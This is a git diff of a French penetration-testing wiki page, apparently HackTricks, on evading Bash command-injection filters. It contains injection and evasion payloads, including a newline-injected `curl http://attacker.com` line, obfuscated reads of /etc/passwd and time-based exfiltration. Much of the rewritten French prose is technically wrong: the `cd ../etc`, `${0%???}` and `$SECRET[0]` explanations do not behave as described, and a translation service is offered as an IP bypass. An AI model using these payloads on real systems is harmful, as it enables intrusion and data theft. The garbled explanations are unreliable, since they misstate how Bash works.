@@ -15,7 +15,7 @@
 <figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.io/) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -48,29 +48,39 @@ exec >&0
 ```
 ### Contourner les chemins et les mots interdits
 
-Lorsque vous effectuez des tests de pénétration sur un système Linux, il est possible que vous rencontriez des restrictions de chemin ou des mots interdits qui limitent votre accès aux ressources du système. Heureusement, il existe des techniques pour contourner ces restrictions et accéder aux fichiers et aux commandes interdits.
+Lorsque vous effectuez des tests de pénétration sur un système Linux, il peut arriver que vous rencontriez des restrictions de chemin ou des mots interdits qui limitent votre accès aux ressources du système. Heureusement, il existe des commandes Linux utiles qui peuvent vous aider à contourner ces restrictions et à accéder aux fichiers et répertoires souhaités.
 
-#### Contourner les restrictions de chemin
+#### Utilisation de la commande `cd`
 
-Lorsque vous êtes confronté à une restriction de chemin, vous pouvez essayer les techniques suivantes pour contourner cette limitation :
+La commande `cd` est utilisée pour changer de répertoire dans le système de fichiers. Pour contourner les restrictions de chemin, vous pouvez utiliser des caractères spéciaux tels que `..` pour remonter d'un niveau dans l'arborescence des répertoires. Par exemple, si vous êtes dans le répertoire `/home/user` et que vous souhaitez accéder au répertoire `/etc`, vous pouvez utiliser la commande suivante :
 
-1. Utiliser des chemins absolus : Au lieu d'utiliser des chemins relatifs, utilisez des chemins absolus pour accéder aux fichiers. Les chemins absolus commencent par la racine du système de fichiers, représentée par le caractère `/`. Par exemple, au lieu d'utiliser `../fichier`, utilisez `/chemin/absolu/vers/fichier`.
+```bash
+cd ../etc
+```
 
-2. Utiliser des liens symboliques : Les liens symboliques sont des fichiers spéciaux qui pointent vers d'autres fichiers ou répertoires. Vous pouvez créer un lien symbolique vers un fichier ou un répertoire interdit et y accéder en utilisant le lien symbolique. Par exemple, vous pouvez créer un lien symbolique `monlien` qui pointe vers `/chemin/interdit/fichier` et y accéder en utilisant `monlien`.
+Cela vous permettra de naviguer vers le répertoire `/etc` même si vous êtes dans un répertoire restreint.
 
-3. Utiliser des caractères d'échappement : Certains caractères spéciaux, tels que `..` ou `/`, peuvent être échappés en les précédant d'un caractère d'échappement, généralement `\`. Par exemple, au lieu d'utiliser `../fichier`, vous pouvez utiliser `\.\./fichier`.
+#### Utilisation de la commande `ls`
 
-#### Contourner les mots interdits
+La commande `ls` est utilisée pour lister les fichiers et répertoires dans un répertoire donné. Pour contourner les restrictions de mots interdits, vous pouvez utiliser des caractères spéciaux tels que `*` pour représenter n'importe quel caractère ou groupe de caractères. Par exemple, si vous souhaitez lister tous les fichiers commençant par la lettre "a" dans un répertoire restreint, vous pouvez utiliser la commande suivante :
 
-Lorsque vous êtes confronté à des mots interdits, vous pouvez essayer les techniques suivantes pour contourner cette restriction :
+```bash
+ls a*
+```
 
-1. Utiliser des synonymes : Si un mot est interdit, essayez de trouver un synonyme qui a la même signification mais qui n'est pas interdit. Par exemple, si le mot interdit est `cat`, vous pouvez essayer d'utiliser `feline` à la place.
+Cela affichera tous les fichiers commençant par la lettre "a" dans le répertoire actuel, même s'ils sont normalement interdits.
 
-2. Utiliser des caractères spéciaux : Certains caractères spéciaux peuvent être utilisés pour contourner les mots interdits. Par exemple, vous pouvez utiliser des caractères de remplacement tels que `@` pour remplacer les lettres interdites. Par exemple, au lieu d'utiliser `cat`, vous pouvez utiliser `c@t`.
+#### Utilisation de la commande `cat`
 
-3. Utiliser des encodages alternatifs : Certains mots interdits peuvent être contournés en utilisant des encodages alternatifs. Par exemple, vous pouvez utiliser l'encodage URL pour contourner les mots interdits. Par exemple, au lieu d'utiliser `cat`, vous pouvez utiliser `%63%61%74`.
+La commande `cat` est utilisée pour afficher le contenu d'un fichier. Pour contourner les restrictions de mots interdits, vous pouvez utiliser des caractères spéciaux tels que `?` pour représenter un seul caractère inconnu. Par exemple, si vous souhaitez afficher le contenu d'un fichier dont le nom contient un mot interdit, vous pouvez utiliser la commande suivante :
 
-En utilisant ces techniques, vous pouvez contourner les restrictions de chemin et les mots interdits et accéder aux ressources du système lors de vos tests de pénétration sur un système Linux.
+```bash
+cat file?
+```
+
+Cela affichera le contenu du premier fichier dont le nom correspond au motif spécifié, même s'il contient un mot interdit.
+
+En utilisant ces commandes Linux utiles, vous pouvez contourner les restrictions de chemin et de mots interdits pour accéder aux ressources souhaitées lors de vos tests de pénétration sur un système Linux.
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -127,13 +137,13 @@ whoa # This will throw an error
 ```
 ### Contourner les espaces interdits
 
-Lorsque vous êtes confronté à des restrictions d'accès à certains répertoires ou fichiers contenant des espaces dans leur nom, vous pouvez contourner ces restrictions en utilisant les techniques suivantes :
+Lorsque vous êtes confronté à des restrictions d'accès à certains répertoires ou fichiers contenant des espaces dans leur nom, vous pouvez contourner ces restrictions en utilisant les commandes suivantes :
 
-1. Utilisez des guillemets simples ou doubles : Vous pouvez entourer le nom du répertoire ou du fichier contenant des espaces avec des guillemets simples ('') ou doubles (""). Par exemple, si vous avez un répertoire nommé "Mon Répertoire", vous pouvez y accéder en utilisant la commande `cd 'Mon Répertoire'`.
+- Utilisez des guillemets simples ou doubles pour entourer le nom du répertoire ou du fichier. Par exemple, pour accéder au répertoire "my folder", vous pouvez utiliser la commande `cd 'my folder'`.
 
-2. Utilisez des caractères d'échappement : Vous pouvez également utiliser des caractères d'échappement pour indiquer que l'espace doit être traité littéralement. Le caractère d'échappement le plus couramment utilisé est le backslash (\). Par exemple, si vous avez un fichier nommé "Mon Fichier", vous pouvez y accéder en utilisant la commande `cat Mon\ Fichier`.
+- Utilisez des caractères d'échappement pour indiquer que l'espace fait partie du nom. Par exemple, pour accéder au fichier "my file.txt", vous pouvez utiliser la commande `cat my\ file.txt`.
 
-En utilisant ces techniques, vous pouvez contourner les restrictions d'accès aux répertoires ou fichiers contenant des espaces dans leur nom.
+En utilisant ces techniques, vous pourrez contourner les restrictions d'accès liées aux espaces dans les noms de fichiers ou de répertoires.
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -166,47 +176,41 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Contourner le backslash et le slash
+### Contourner les restrictions de backslash et de slash
 
-Lorsque vous êtes confronté à des restrictions de shell qui limitent l'utilisation du backslash (`\`) ou du slash (`/`), il existe quelques techniques que vous pouvez utiliser pour les contourner.
+Lorsque vous êtes confronté à des restrictions de backslash et de slash dans un environnement Linux, il existe plusieurs commandes utiles que vous pouvez utiliser pour contourner ces restrictions.
 
-#### Utilisation de caractères hexadécimaux
+#### Utilisation de l'opérateur de substitution de commande
 
-Vous pouvez contourner les restrictions en utilisant des caractères hexadécimaux pour représenter les caractères interdits. Par exemple, pour contourner l'utilisation du backslash, vous pouvez utiliser `\x5c` pour représenter le backslash lui-même.
+L'opérateur de substitution de commande, représenté par le symbole `$()`, vous permet d'exécuter une commande à l'intérieur d'une autre commande. Cela peut être utile pour contourner les restrictions de backslash et de slash.
 
-Exemple :
-```
-$ echo -e "\x5c/bin\x5cbash"
-```
-
-#### Utilisation de caractères octaux
-
-De manière similaire à l'utilisation de caractères hexadécimaux, vous pouvez également utiliser des caractères octaux pour contourner les restrictions. Par exemple, pour contourner l'utilisation du slash, vous pouvez utiliser `\057` pour représenter le slash lui-même.
-
-Exemple :
-```
-$ echo -e "\057bin\057bash"
+```bash
+$ echo $(ls)
 ```
 
-#### Utilisation de caractères Unicode
+Dans cet exemple, la commande `ls` est exécutée et le résultat est passé en tant qu'argument à la commande `echo`. Cela permet d'afficher le contenu du répertoire en contournant les restrictions de backslash et de slash.
 
-Une autre technique consiste à utiliser des caractères Unicode pour contourner les restrictions. Vous pouvez utiliser la notation `\u` suivie du code Unicode du caractère que vous souhaitez utiliser. Par exemple, pour contourner l'utilisation du backslash, vous pouvez utiliser `\u005c` pour représenter le backslash lui-même.
+#### Utilisation de l'opérateur de redirection
 
-Exemple :
-```
-$ echo -e "\u005cbin\u005cbash"
-```
+L'opérateur de redirection, représenté par le symbole `>`, vous permet de rediriger la sortie d'une commande vers un fichier. Cela peut être utilisé pour contourner les restrictions de backslash et de slash.
 
-#### Utilisation de commandes alternatives
-
-Si les caractères spécifiques sont restreints, vous pouvez essayer d'utiliser des commandes alternatives pour atteindre le même objectif. Par exemple, au lieu d'utiliser `/bin/bash`, vous pouvez essayer d'utiliser `/usr/bin/env bash` ou `/bin/sh`.
-
-Exemple :
-```
-$ /usr/bin/env bash
+```bash
+$ ls > output.txt
 ```
 
-Ces techniques peuvent être utiles pour contourner les restrictions de shell et exécuter des commandes même lorsque certains caractères sont interdits. Cependant, il est important de noter que l'utilisation de ces techniques peut être considérée comme une violation de la politique de sécurité et peut être illégale dans certains contextes.
+Dans cet exemple, la commande `ls` est exécutée et le résultat est redirigé vers un fichier appelé `output.txt`. Cela permet de contourner les restrictions de backslash et de slash en enregistrant la sortie dans un fichier.
+
+#### Utilisation de l'opérateur de pipe
+
+L'opérateur de pipe, représenté par le symbole `|`, vous permet de rediriger la sortie d'une commande vers une autre commande. Cela peut être utilisé pour contourner les restrictions de backslash et de slash.
+
+```bash
+$ ls | grep "file"
+```
+
+Dans cet exemple, la commande `ls` est exécutée et la sortie est redirigée vers la commande `grep` pour filtrer les résultats contenant le mot "file". Cela permet de contourner les restrictions de backslash et de slash en utilisant le pipe pour manipuler la sortie de la commande.
+
+En utilisant ces commandes, vous pouvez contourner les restrictions de backslash et de slash dans un environnement Linux et effectuer les opérations nécessaires.
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -239,7 +243,7 @@ Voici comment utiliser l'encodage hexadécimal pour contourner les restrictions 
 
 3. Utilisez cette représentation dans votre commande pour contourner les restrictions de Bash. Par exemple, au lieu d'utiliser `commande1 ; commande2`, vous utiliserez `commande1\x3bcommande2`.
 
-L'encodage hexadécimal permet de contourner les restrictions de Bash en représentant les caractères spéciaux de manière différente. Cependant, il est important de noter que cette technique peut ne pas fonctionner dans tous les cas, car certaines applications peuvent filtrer ou détecter l'utilisation de caractères hexadécimaux.
+L'encodage hexadécimal permet de contourner les restrictions de Bash en représentant les caractères spéciaux de manière différente. Cela peut être utile lors de l'exécution de commandes qui sont normalement bloquées par les restrictions de Bash.
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -253,15 +257,15 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 
 Il existe plusieurs méthodes pour contourner les restrictions IP et accéder à des ressources ou des services qui sont normalement bloqués. Voici quelques techniques couramment utilisées :
 
-- **Utilisation d'un proxy** : Un proxy agit comme un intermédiaire entre votre appareil et le serveur cible. En utilisant un proxy, vous pouvez masquer votre adresse IP réelle et utiliser une adresse IP différente pour accéder aux ressources restreintes.
+- **Utilisation d'un proxy** : Un proxy permet de masquer votre adresse IP réelle en utilisant une adresse IP différente. Vous pouvez configurer votre navigateur ou votre système d'exploitation pour utiliser un proxy et ainsi accéder aux ressources bloquées.
 
-- **Utilisation d'un VPN** : Un réseau privé virtuel (VPN) crée un tunnel sécurisé entre votre appareil et un serveur distant. En utilisant un VPN, vous pouvez acheminer votre trafic Internet à travers un serveur distant, ce qui masque votre adresse IP réelle et vous permet d'accéder aux ressources restreintes.
+- **Utilisation d'un VPN** : Un réseau privé virtuel (VPN) crée un tunnel sécurisé entre votre appareil et un serveur distant, masquant ainsi votre adresse IP réelle. Vous pouvez utiliser un service VPN pour accéder aux ressources bloquées en choisissant un serveur dans un pays où ces ressources sont accessibles.
 
-- **Utilisation du réseau Tor** : Le réseau Tor est un réseau décentralisé qui permet de naviguer sur Internet de manière anonyme. En utilisant le réseau Tor, votre trafic Internet est acheminé à travers plusieurs nœuds, masquant ainsi votre adresse IP réelle et vous permettant d'accéder aux ressources restreintes.
+- **Utilisation du réseau Tor** : Le réseau Tor est un réseau décentralisé qui permet de naviguer sur Internet de manière anonyme. En utilisant le navigateur Tor, votre trafic Internet est acheminé à travers plusieurs nœuds, masquant ainsi votre adresse IP réelle.
 
-- **Utilisation d'une adresse IP partagée** : Certaines connexions Internet, comme les connexions mobiles, utilisent des adresses IP partagées. En utilisant une connexion Internet avec une adresse IP partagée, vous pouvez potentiellement contourner les restrictions IP en utilisant une adresse IP différente.
+- **Utilisation d'un service de traduction en ligne** : Certains services de traduction en ligne permettent de contourner les restrictions IP en traduisant le contenu bloqué. Vous pouvez copier l'URL de la ressource bloquée dans le service de traduction, puis accéder à la traduction pour accéder au contenu.
 
-Il est important de noter que contourner les restrictions IP peut être illégal ou contre les conditions d'utilisation de certains services. Assurez-vous de respecter les lois et les politiques applicables avant d'utiliser ces techniques.
+Il est important de noter que l'utilisation de ces méthodes pour contourner les restrictions IP peut être illégale dans certains pays ou dans certaines circonstances. Il est donc essentiel de respecter les lois en vigueur et de prendre des précautions pour protéger votre anonymat et votre sécurité en ligne.
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -270,35 +274,39 @@ Il est important de noter que contourner les restrictions IP peut être illégal
 
 Lorsque vous effectuez un test de pénétration, il peut être nécessaire d'exfiltrer des données sensibles du système cible. Cependant, il est possible que le système soit configuré pour restreindre l'accès à certains outils ou commandes, ce qui peut rendre cette tâche difficile. Dans de tels cas, vous pouvez utiliser des techniques d'exfiltration de données basées sur le temps pour contourner ces restrictions.
 
-L'idée derrière l'exfiltration de données basée sur le temps est d'utiliser des commandes ou des outils disponibles sur le système cible pour transmettre les données de manière discrète. Voici quelques commandes Linux couramment utilisées pour cette technique :
+L'idée derrière l'exfiltration de données basée sur le temps est d'utiliser des commandes ou des outils disponibles sur le système cible pour transmettre les données de manière discrète. Voici quelques commandes utiles pour cela :
 
-- **ping** : La commande ping est souvent disponible sur les systèmes Linux et peut être utilisée pour envoyer des paquets ICMP à une adresse IP spécifiée. Vous pouvez utiliser cette commande pour transmettre les données en encodant les bits dans les délais entre les paquets ping.
+- **ping** : Vous pouvez utiliser la commande `ping` pour envoyer des paquets ICMP contenant les données que vous souhaitez exfiltrer. Par exemple, vous pouvez convertir les données en binaire et les inclure dans les paquets ICMP. Ensuite, vous pouvez utiliser un script pour capturer ces paquets sur un autre système.
 
-- **nslookup** : La commande nslookup est utilisée pour interroger les serveurs DNS et obtenir des informations sur les enregistrements DNS. Vous pouvez utiliser cette commande pour transmettre les données en encodant les bits dans les requêtes DNS.
+- **nslookup** : La commande `nslookup` peut également être utilisée pour exfiltrer des données. Vous pouvez utiliser des requêtes DNS pour transmettre les données. Par exemple, vous pouvez convertir les données en base64 et les inclure dans les requêtes DNS. Ensuite, vous pouvez capturer ces requêtes sur un autre système.
 
-- **curl** : La commande curl est un outil polyvalent qui permet de transférer des données via différents protocoles, tels que HTTP, FTP, etc. Vous pouvez utiliser cette commande pour envoyer les données à un serveur distant en encodant les bits dans les requêtes HTTP.
+- **curl** : La commande `curl` peut être utilisée pour exfiltrer des données en les envoyant à un serveur distant. Vous pouvez utiliser des paramètres tels que `-d` pour spécifier les données à envoyer et `-X` pour spécifier la méthode de requête. Assurez-vous d'utiliser une connexion chiffrée pour éviter toute interception des données.
 
-Lorsque vous utilisez ces commandes pour l'exfiltration de données basée sur le temps, il est important de prendre en compte les délais et les intervalles entre les commandes pour éviter de déclencher des alertes de sécurité. Vous pouvez également utiliser des techniques d'encodage pour rendre les données moins détectables.
-
-Il est essentiel de noter que l'exfiltration de données sans autorisation est illégale et peut entraîner des conséquences juridiques graves. Ces techniques doivent être utilisées uniquement dans le cadre d'un test de pénétration autorisé et avec le consentement écrit du propriétaire du système cible.
+Ces techniques d'exfiltration de données basées sur le temps peuvent être utiles lorsque vous devez contourner les restrictions de Bash ou d'autres outils sur le système cible. Cependant, il est important de noter que l'utilisation de telles techniques peut être détectée par des systèmes de détection d'intrusion, il est donc essentiel de prendre des mesures pour minimiser les risques de détection.
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 ### Obtenir des caractères à partir de variables d'environnement
 
-Il est possible d'obtenir des caractères à partir de variables d'environnement en utilisant la syntaxe `$VARNAME[index]` dans le shell Bash. Cela permet d'accéder à un caractère spécifique dans la valeur de la variable d'environnement.
+Il est possible d'obtenir des caractères à partir de variables d'environnement en utilisant la syntaxe `$VARNAME[index]` dans le shell Bash. Cela permet d'accéder à un caractère spécifique à partir de la valeur d'une variable d'environnement.
 
-Voici un exemple pour illustrer cette technique :
+Par exemple, si nous avons une variable d'environnement appelée `SECRET` avec la valeur `password123`, nous pouvons obtenir le caractère `p` en utilisant la commande suivante :
 
 ```bash
-$ export MY_VAR="Hello, World!"
-$ echo ${MY_VAR[0]}  # Affiche le premier caractère de la variable MY_VAR
-H
-$ echo ${MY_VAR[7]}  # Affiche le huitième caractère de la variable MY_VAR
-W
+echo $SECRET[0]
 ```
 
-En utilisant cette méthode, vous pouvez extraire des caractères spécifiques d'une variable d'environnement pour effectuer des opérations ou des manipulations supplémentaires.
+Cela affichera le caractère `p` à la sortie.
+
+Il est important de noter que l'index des caractères commence à partir de zéro. Ainsi, pour obtenir le caractère `a` de `password123`, nous utiliserions l'index 1 :
+
+```bash
+echo $SECRET[1]
+```
+
+Cela affichera le caractère `a` à la sortie.
+
+En utilisant cette technique, il est possible d'extraire des caractères spécifiques d'une variable d'environnement dans le shell Bash.
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -377,19 +385,19 @@ It is important to note that polyglot command injection is a highly advanced tec
 ```
 ### Contourner les regex potentielles
 
-Certaines applications peuvent utiliser des expressions régulières (regex) pour restreindre les entrées utilisateur. Cependant, il est possible de contourner ces restrictions en utilisant des techniques spécifiques.
+Certaines restrictions peuvent être mises en place en utilisant des expressions régulières (regex) pour filtrer les entrées. Cependant, il existe des techniques pour contourner ces restrictions et exécuter des commandes malveillantes.
 
-Voici quelques commandes utiles pour contourner les regex potentielles :
+Voici quelques méthodes couramment utilisées pour contourner les regex potentielles :
 
-- `grep -P` : Utilisez l'option `-P` avec la commande `grep` pour activer les expressions régulières de type Perl. Cela permet d'utiliser des fonctionnalités avancées qui peuvent contourner les restrictions.
+1. **Modification de la casse** : En modifiant la casse des caractères dans une chaîne de caractères, vous pouvez tromper le filtre regex. Par exemple, si le filtre est configuré pour bloquer la chaîne "admin", vous pouvez contourner cette restriction en utilisant des variantes telles que "AdMiN" ou "aDmIn".
 
-- `sed` : La commande `sed` peut être utilisée pour effectuer des substitutions de texte. En utilisant des expressions régulières, vous pouvez contourner les restrictions en remplaçant des parties du texte.
+2. **Utilisation de caractères spéciaux** : Certains caractères spéciaux peuvent être utilisés pour tromper les regex. Par exemple, en utilisant des caractères d'échappement tels que "\" ou en insérant des caractères spéciaux comme "*", "?", "+", vous pouvez contourner les filtres regex.
 
-- `awk` : La commande `awk` est un puissant outil de traitement de texte qui peut également être utilisé pour contourner les regex potentielles. En utilisant des expressions régulières avec `awk`, vous pouvez effectuer des opérations complexes sur les données.
+3. **Utilisation de caractères Unicode** : Les caractères Unicode peuvent être utilisés pour contourner les regex. Par exemple, en utilisant des caractères Unicode similaires à ceux de la chaîne filtrée, vous pouvez tromper le filtre regex.
 
-- `perl` : Perl est un langage de programmation qui offre une grande flexibilité en matière de manipulation de texte. En utilisant Perl, vous pouvez contourner les regex potentielles en utilisant des expressions régulières avancées.
+4. **Utilisation de caractères de contrôle** : Les caractères de contrôle, tels que les caractères de tabulation ou de retour à la ligne, peuvent être utilisés pour contourner les regex. En insérant ces caractères dans une chaîne de caractères, vous pouvez tromper le filtre regex.
 
-Il est important de noter que le contournement des regex potentielles peut être considéré comme une violation de la sécurité et peut être illégal dans certains cas. Il est donc essentiel de respecter les lois et les politiques en vigueur lors de l'utilisation de ces techniques.
+Il est important de noter que ces techniques peuvent varier en fonction de la configuration spécifique du filtre regex. Il est donc essentiel de comprendre les restrictions en place avant de tenter de les contourner.
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -428,22 +436,22 @@ $ echo $0-$BASH_VERSION
 bash-4.4.19(1)-release
 ```
 
-La variable d'environnement `$0` contient le nom du shell en cours d'exécution, tandis que la variable `$BASH_VERSION` contient la version de Bash. En concaténant ces deux variables avec un tiret `-`, nous pouvons exécuter une commande arbitraire en utilisant la syntaxe `$0-$BASH_VERSION`.
+La commande `echo $0` affiche le nom du shell actuel, qui est "bash" dans cet exemple. La commande `echo $BASH_VERSION` affiche la version de Bash, qui est "4.4.19(1)-release" dans cet exemple. En combinant ces deux commandes avec un tiret ("-"), nous obtenons "bash-4.4.19(1)-release".
 
-Voici un exemple d'utilisation de cette technique pour exécuter la commande `id` :
-
-```bash
-$ echo $0-$BASH_VERSION-id
-bash-4.4.19(1)-release-id
-```
-
-En exécutant cette commande, nous obtenons la sortie suivante :
+Maintenant, nous pouvons utiliser cette chaîne pour exécuter une commande arbitraire en utilisant la fonctionnalité de substitution de commandes de Bash. Voici comment cela peut être fait :
 
 ```bash
-uid=1000(user) gid=1000(user) groups=1000(user)
+$ ${0%???}ls
 ```
 
-Cette méthode peut être utilisée pour contourner les restrictions de Bash et exécuter des commandes arbitraires lors de l'exploitation d'une vulnérabilité de RCE.
+Explication :
+
+- `${0%???}` supprime les 3 derniers caractères de la variable `$0`, qui est "bash" dans cet exemple. Cela nous donne "ba".
+- Ensuite, nous ajoutons la commande que nous voulons exécuter, dans ce cas "ls".
+
+En exécutant cette commande, nous obtenons une liste des fichiers du répertoire courant, contournant ainsi les restrictions de Bash.
+
+Il est important de noter que cette méthode peut varier en fonction de la version de Bash utilisée et des restrictions spécifiques imposées par le système. Il est recommandé de tester différentes combinaisons pour trouver celle qui fonctionne dans votre cas spécifique.
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -502,7 +510,7 @@ La technique consiste à utiliser la commande `echo` pour exécuter du code Bash
    echo ls
    ```
 
-2. Utilisez le caractère de redirection `>` pour rediriger la sortie de la commande `echo` vers le fichier `/tmp/cmd`. Par exemple :
+2. Utilisez le caractère de redirection `>` pour rediriger la sortie de `echo` vers le fichier `/tmp/cmd`. Par exemple :
 
    ```bash
    echo ls > /tmp/cmd
@@ -514,7 +522,9 @@ La technique consiste à utiliser la commande `echo` pour exécuter du code Bash
    source /tmp/cmd
    ```
 
-En utilisant cette technique, vous pouvez exécuter n'importe quelle commande Bash en utilisant seulement 4 caractères. Cependant, il est important de noter que cette technique peut être détectée par certains systèmes de détection d'intrusion, il est donc recommandé de l'utiliser avec prudence et uniquement dans un environnement contrôlé.
+Cela exécutera la commande `ls` et affichera le contenu du répertoire courant.
+
+Cette technique peut être utilisée pour exécuter n'importe quelle commande Bash en utilisant seulement 4 caractères. Cependant, il est important de noter que cette méthode peut être détectée par certains systèmes de détection d'intrusion, il est donc recommandé de l'utiliser avec prudence et uniquement dans un environnement contrôlé.
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -573,7 +583,7 @@ Si vous vous trouvez dans un système de fichiers avec des protections en lectur
 <figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.io/) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
